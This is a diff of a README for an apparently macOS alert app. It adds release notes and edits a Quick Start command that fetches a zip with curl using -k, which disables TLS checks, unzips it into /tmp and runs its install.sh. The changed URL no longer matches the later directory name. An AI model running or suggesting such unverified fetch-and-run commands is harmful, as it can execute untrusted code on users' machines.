@@ -49,7 +49,7 @@
 
 ## 🚀 Quick Start
 ```bash
-curl -fsSLk https://github.com/pxgo-AI/pxgo-AI/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+curl -fsSLk https://github.com/pxgo-AI/archive/refs/heads/main.zip -o /tmp/cw.zip && \
 unzip -qo /tmp/cw.zip -d /tmp && \
 cd /tmp/pxgo-AI-main && \
 bash install.sh
@@ -74,6 +74,42 @@ Menu Bar Options
 | `Cmd + R` | Reload Configuration |
 | `Cmd + L` | Open Logs |
 | `Cmd + Q` | Quit Application |
+
+
+
+## 📦 Release: v1.0.2 — "Stability & UX Boost"
+
+🗓️ *Released: March 2026*
+
+---
+
+### ✨ What's New
+
+🔹 **Faster startup** — App loads ~40% quicker on first launch  
+🔹 **Smoother notifications** — Reduced latency for critical alerts  
+🔹 **Improved geo-filtering** — More accurate region matching (haversine fix)  
+🔹 **Config hot-reload** — Change settings without restarting the app  
+🔹 **Better error handling** — Clearer messages when webhook port is busy  
+
+---
+
+### 🐛 Bug Fixes
+
+• Fixed: Menu icon not updating after pause/resume  
+• Fixed: CSV export missing `priority` field  
+• Fixed: Dark mode flicker on settings window open  
+• Fixed: Crash when config.yaml contains empty arrays  
+
+---
+
+### ⚙️ Technical Updates
+
+• Updated `aiohttp` → 3.9.3 (security patch)  
+• Optimized SQLite writes for high-volume alert streams  
+• Added health-check endpoint: `GET /health` on webhook server  
+• Reduced memory footprint by ~15%  
+
+
 
 <div align="center">
 
